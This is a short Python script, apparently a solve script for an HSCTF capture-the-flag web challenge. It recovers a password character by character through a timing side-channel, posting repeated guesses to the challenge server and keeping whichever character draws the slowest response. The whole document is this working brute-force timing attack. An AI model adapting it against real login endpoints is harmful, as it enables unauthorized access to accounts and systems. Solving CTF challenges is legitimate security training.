import requests

text = "0123456789abcdefghijklmnopqrstuvwxyz_}"

flag = "hsctf{"

for _ in range(30):
    time = [0.1 for _ in range(38)]
    for _ in range(5):
        for i in range(38):

            payload = {"password": flag + text[i]}

            r = requests.post(
                "https://networked-password.web.chal.hsctf.com", data=payload
            )

            response_time = r.elapsed.total_seconds()

            time[i] += response_time

            print(payload, " response time : ", response_time)

    flag += text[time.index(max(time))]

    print("flag is ", flag)
